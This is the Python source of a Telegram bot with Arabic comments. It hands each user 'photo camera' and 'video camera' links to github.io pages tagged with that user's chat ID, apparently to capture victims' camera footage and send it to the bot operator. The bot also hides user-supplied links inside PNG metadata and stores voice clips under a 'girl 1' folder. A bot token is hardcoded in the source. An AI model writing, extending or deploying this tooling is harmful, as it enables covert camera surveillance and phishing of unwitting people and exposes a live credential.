import os
import json
import urllib3
import telebot
from telebot import types
from PIL import Image, PngImagePlugin
import threading
import http.server

# إيقاف تحذيرات الشهادات لضمان استقرار الاتصال
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# إعداد توكن البوت الخاص بك
BOT_TOKEN = os.getenv("BOT_TOKEN", "8446745973:AAFbl0cHMVXW4ZHvUQHnuWqJjf62597qBl0")
bot = telebot.TeleBot(BOT_TOKEN)

# مسار قاعدة بيانات الأصوات الآمن على Railway
DB_FILE = "/tmp/voice_db.json" if os.path.exists("/tmp") else "voice_db.json"

PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId/"

user_states = {}
user_data = {}

# --- سيرفر وهمي لإبقاء Railway مستقراً ويمنع الـ Crash ---
def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    server_address = ('', port)
    httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
    print(f"📡 السيرفر الوهمي مستقر ويعمل على المنفذ: {port}")
    httpd.serve_forever()

# --- إدارة قاعدة بيانات الأصوات المحمية ---
def load_db():
    if not os.path.exists(DB_FILE) or os.path.getsize(DB_FILE) == 0:
        return {}
    with open(DB_FILE, 'r', encoding='utf-8') as f:
        try: return json.load(f)
        except: return {}

def save_db(db):
    try:
        dir_name = os.path.dirname(DB_FILE)
        if dir_name and not os.path.exists(dir_name):
            os.makedirs(dir_name, exist_ok=True)
        with open(DB_FILE, 'w', encoding='utf-8') as f: 
            json.dump(db, f, indent=4, ensure_ascii=False)
    except Exception as e:
        print(f"تحذير حفظ قاعدة البيانات: {e}")

# --- دالة حقن الرابط في الصورة ---
def hide_link_in_metadata(image_path, link, output_path):
    try:
        img = Image.open(image_path).convert("RGB")
        meta = PngImagePlugin.PngInfo()
        meta.add_text("URL_LINK", link)
        img.save(output_path, "PNG", pnginfo=meta)
    except Exception as e:
        print(f"خطأ ميتاداتا: {e}")

# --- لوحة التحكم بالترتيب العمودي (تحت بعضها البعض) باستخدام InlineKeyboardMarkup ---
def get_main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🖼️ طلب رابط كاميرا الصور", callback_data="get_photo_link"),
        types.InlineKeyboardButton("🎥 طلب رابط كاميرا الفيديو", callback_data="get_video_link"),
        types.InlineKeyboardButton("🔒 حقن رابط في صورة", callback_data="inject_start"),
        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu")
    )
    return markup

# --- استقبال أمر البدء (الرسالة الترحيبية الرسمية) ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = "🤖 **المطور سيف الدين يرحب بك في البوت الشامل المطور!**\n\nالرجاء اختيار الخدمة المطلوبة من القائمة العمودية بالأسفل 👇"
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=get_main_keyboard())

# --- معالجة الضغط على جميع الأزرار (Callback Queries) وحل مشكلة الـ Edit ---
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    db = load_db()

    if call.data == "inject_start":
        user_states[chat_id] = "waiting_for_image_inject"
        # تم استبدال الـ Edit بـ send_message وتصفير الإشعار لمنع الخطأ الأحمر نهائياً
        bot.send_message(chat_id, "📸 **أرسل الصورة الآن لحقن الرابط داخل بياناتها:**", parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        
    elif call.data == "get_photo_link":
        link = f"{PHOTO_PAGE_URL}?chatId={chat_id}"
        bot.send_message(chat_id, f"🔗 رابط كاميرا الصور الخاص بك:\n`{link}`", parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        
    elif call.data == "get_video_link":
        link = f"{VIDEO_PAGE_URL}?chatId={chat_id}"
        bot.send_message(chat_id, f"🔗 رابط كاميرا الفيديو الخاص بك:\n`{link}`", parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        
    elif call.data == "voice_menu":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("👩 الفتاة 1", callback_data="girl_1_menu"))
        markup.add(types.InlineKeyboardButton("🔙 عودة للقائمة الرئيسية", callback_data="main_menu"))
        bot.edit_message_text("اختر المجلد المطلوب:", chat_id, msg_id, reply_markup=markup)
        
    elif call.data == "girl_1_menu":
        if not db:
            bot.answer_callback_query(call.id, "⚠️ لا توجد مقاطع محفوظة حالياً في السيرفر.")
            return
        markup = types.InlineKeyboardMarkup(row_width=2)
        for i in range(1, 11):
            name = f"مقطع {i}"
            if name in db: 
                markup.add(types.InlineKeyboardButton(name, callback_data=f"play:{name}"))
        markup.add(types.InlineKeyboardButton("🔙 عودة", callback_data="voice_menu"))
        bot.edit_message_text("📂 مقاطع الفتاة 1 الكاملة والمتاحة:", chat_id, msg_id, reply_markup=markup)
        
    elif call.data == "main_menu":
        welcome_text = "🤖 **المطور سيف الدين يرحب بك في البوت الشامل المطور!**\n\nالرجاء اختيار الخدمة المطلوبة من القائمة العمودية بالأسفل 👇"
        bot.edit_message_text(welcome_text, chat_id, msg_id, parse_mode="Markdown", reply_markup=get_main_keyboard())
        
    elif call.data.startswith("play:"):
        name = call.data.split(":")[1]
        file_id = db.get(name)
        if file_id:
            try: 
                bot.send_voice(chat_id, file_id)
                bot.answer_callback_query(call.id)
            except: 
                bot.answer_callback_query(call.id, "❌ خطأ استدعاء الصوت من السيرفر.")
        else: 
            bot.answer_callback_query(call.id, "❌ غير متاح حالياً.")

# --- معالجة الميديا المستلمة من المستخدم لحقن الصور وحفظ الفويسات ---
@bot.message_handler(content_types=['photo', 'text', 'voice'])
def handle_all_media(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)

    # استقبال وحفظ فويسات الفتاة 1 تلقائياً
    if message.voice:
        db = load_db()
        next_slot = len(db) + 1
        if next_slot > 10: db, next_slot = {}, 1
        name = f"مقطع {next_slot}"
        db[name] = message.voice.file_id
        save_db(db)
        bot.reply_to(message, f"✅ تم حفظ وتحديث ({name}) بنجاح داخل مجلد الفتاة 1!")
        
    # خطوة استقبال الصورة للحقن
    elif state == "waiting_for_image_inject" and message.photo:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded = bot.download_file(file_info.file_path)
        img_path = os.path.join("/tmp" if os.path.exists("/tmp") else ".", f"img_{chat_id}.png")
        with open(img_path, 'wb') as f: f.write(downloaded)
        user_data[chat_id] = img_path
        user_states[chat_id] = "waiting_for_link"
        bot.reply_to(message, "📥 تم حفظ الصورة بنجاح! أرسل الآن الرابط المراد حقنه داخل ميتاداتا الصورة:")
        
    # خطوة استقبال الرابط وإتمام الحقن
    elif state == "waiting_for_link" and message.text:
        img_path = user_data.get(chat_id)
        out_path = os.path.join("/tmp" if os.path.exists("/tmp") else ".", f"out_{chat_id}.png")
        hide_link_in_metadata(img_path, message.text, out_path)
        if os.path.exists(out_path):
            with open(out_path, 'rb') as f: 
                bot.send_photo(chat_id, f, caption=f"✅ تم حقن الميتاداتا بنجاح!\nالرابط: {message.text}")
        user_states[chat_id] = None
        if os.path.exists(img_path): os.remove(img_path)
        if os.path.exists(out_path): os.remove(out_path)

if __name__ == '__main__':
    # تشغيل السيرفر الوهمي في الخلفية لضمان استقرار البوت على ريلوي
    threading.Thread(target=run_dummy_server, daemon=True).start()
    
    print("🚀 تم تشغيل البوت وإصلاح الأخطاء بنجاح تام...")
    bot.polling(none_stop=True, interval=0, timeout=40)
